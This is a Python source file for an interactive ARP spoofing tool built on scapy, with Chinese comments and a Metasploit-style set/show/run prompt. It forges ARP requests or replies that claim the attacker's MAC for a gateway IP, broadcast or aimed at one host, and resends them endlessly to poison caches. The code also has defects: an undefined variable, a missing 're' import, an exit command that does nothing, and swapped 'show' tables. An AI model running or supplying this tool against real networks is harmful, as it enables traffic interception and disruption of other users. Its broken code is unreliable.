import os
import sys
import signal
from prettytable import PrettyTable

os.system("")

from scapy.all import (
    get_if_hwaddr,  # 获取本机网络接口的函数
    getmacbyip,  # 通过IP地址获取其Mac地址的函数
    ARP,  # 构造ARP数据包
    Ether,  # 构造以太网数据包
    sendp,  # 在第二层发送数据包
)

global data
data = {"ff": "1", "pattern": "0", "luan_ip": "", "target_ip": "", "we": ""}


def mainl():

    # 获取本机网络接口
    mac = get_if_hwaddr(data["we"])

    # 主机型欺骗
    # 网关型欺骗

    # 请求包
    def build_req():
        # 当没有明确攻击目标时，广播
        if data["ff"] == "1":
            pkt = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / ARP(
                hwsrc=mac, psrc=luan_mac
            )

        elif data["ff"] == "0":
            # 通过IP地址获取其MAC地址
            target_mac = getmacbyip(data["target_ip"])
            # 没有获取到MAC地址
            if target_mac is None:
                print("\033[33m[E] Error: 没有获取到MAC地址\033[0m")
                sys.exit(1)

            # 构造包
            pkt = Ether(src=mac, dst=target_mac) / ARP(
                hwsrc=mac,
                psrc=data["luan_ip"],
                hwdst=target_mac,
                pdst=data["target_ip"],
            )
        return pkt

    # 响应包
    def build_rep():
        if data["ff"] == "1":
            # op=1(请求包) op=2(响应包)
            pkt = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / ARP(
                hwsrc=mac, psrc=data["luan_ip"], op=2
            )
        elif data["ff"] == "0":
            target_mac = getmacbyip(data["target_ip"])
            if target_mac is None:
                print("\033[33m[E] Error: 无法解析目标MAC地址\033[0m")
                sys.exit(1)
            pkt = Ether(src=mac, dst=target_mac) / ARP(
                hwsrc=mac,
                psrc=data["luan_ip"],
                hwdst=target_mac,
                pdst=data["target_ip"],
                op=2,
            )
        return pkt

    # 请求
    if data["pattern"] == "0":
        pkt = build_req()
    # 响应
    elif data["pattern"] == "1":
        pkt = build_rep()
    print("\033[36m[O] ARP包已发送...\033[0m")
    while True:

        # 在两次发送数据包之间有一定的时间间隔，使用inter选项，表示每隔2秒发送一个数据包
        sendp(pkt, inter=2, iface=data["we"], verbose=False)


class mainll:
    def zhuli(d):

        if d == "exit" or d == "quit":
            cf = 1

        elif re.findall("set (.*) (.*)", d):
            dd = re.findall("set (.*) (.*)", d)

            data[dd[0][0]] = dd[0][1]
            print(f"{dd[0][0]} => {dd[0][1]}")
        elif re.findall("set (.*)=(.*)", d):
            dd = re.findall("set (.*)=(.*)", d)
            data[dd[0][0]] = dd[0][1]
            print(f"{dd[0][0]} => {dd[0][1]}")
        elif d == "run":
            mainl()
        elif d == "show":

            if data["ff"] == "1":
                tb = PrettyTable()
                tb.add_column("必需的", ["模式", "网关ip", "目标ip", "网卡"])
                tb.add_column("name", ["pattern", "luan_ip", "target_ip", "we"])
                tb.add_column(
                    "value",
                    [data["pattern"], data["luan_ip"], data["target_ip"], data["we"]],
                )
                print(tb)

            elif data["ff"] == "0":
                tb = PrettyTable()
                tb.add_column("必需的", ["模式", "网关ip", "网卡"])
                tb.add_column("name", ["pattern", "luan_ip", "we"])
                tb.add_column("value", [data["pattern"], data["luan_ip"], data["we"]])
                print(tb)
            print("[\033[37mSET UP\033[0m]  还可以进行的设置  是否广播ff:" + data["ff"])
        else:
            print("E:?? help")

    def scanf():

        cf = 0
        while cf == 0:
            d = input("RPG(\033[31marp_duhua\033[0m)>")
            if d:
                # print(1)
                mainll.zhuli(d)
            else:
                print("E:input ??")


def main():
    mainll.scanf()


main()
